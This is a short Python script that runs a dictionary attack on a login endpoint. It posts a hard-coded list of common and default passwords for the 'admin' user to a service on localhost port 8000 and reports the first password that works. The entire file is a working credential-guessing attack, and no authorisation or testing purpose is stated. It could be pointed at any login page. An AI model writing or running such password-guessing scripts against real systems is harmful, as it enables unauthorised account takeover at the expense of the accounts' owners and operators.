import json, urllib.request
passwords = ["Test123!@#", "admin123", "Admin123!", "password", "admin", "ChangeMe!2024", "Admin@123", "test123", "Admin1234!", "P@ssw0rd", "Admin1234", "qwerty", "root", "123456"]
for pw in passwords:
    data = json.dumps({"username": "admin", "password": pw}).encode()
    req = urllib.request.Request("http://localhost:8000/login", data=data, headers={"Content-Type": "application/json"})
    try:
        resp = urllib.request.urlopen(req)
        body = resp.read().decode()
        print("FOUND: " + pw + " -> " + body)
        break
    except Exception as e:
        print("Fail: " + pw + " -> " + str(e))